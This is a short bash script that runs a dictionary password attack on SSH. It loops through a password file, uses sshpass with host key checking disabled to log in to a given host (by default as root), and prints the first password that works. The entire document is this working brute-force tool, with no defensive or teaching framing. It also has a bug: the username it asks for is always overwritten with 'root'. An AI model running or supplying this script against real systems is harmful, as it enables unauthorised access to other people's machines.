#!/bin/bash

# This script uses a dictionary file to test passwords against a host while using ssh.
# It uses 'root' as the default user, but it asks if another username is being tested.
# just create a 'passwd.txt' file or use a dictitionary file, Them run as:
#    ./test-password.sh [hostname/IP address]

PASSWDFILE="$HOME/passwd.txt"
if [ ! -f "$PASSWDFILE" ]
then
        echo -e "$0: File '${PASSWDFILE}' not found.\n";
        echo -e "Create or download password list to ~/passwd.txt\\n\\nUsage: testpasswd [IP ADDRESS]\\nUser 'root' is used.";
else
        echo -e "Press ENTER key to use 'root' as the default user\nOr enter another username: "; read -r USERID;
        USERID="root"; while read -r PASSWD;
        do sshpass -p "$PASSWD" ssh -oStrictHostKeyChecking=no -oNumberOfPasswordPrompts=1 -l "$USERID" "$1" 'touch /tmp/1' 2> /dev/null;
        if [ $? -eq 0 ]; then echo -e "$(printf '%.s=' {1..50})\\nPassword is: $PASSWD\\n$(printf '%.s=' {1..50})\\n"; exit 0; fi;
        done < "$PASSWDFILE";
fi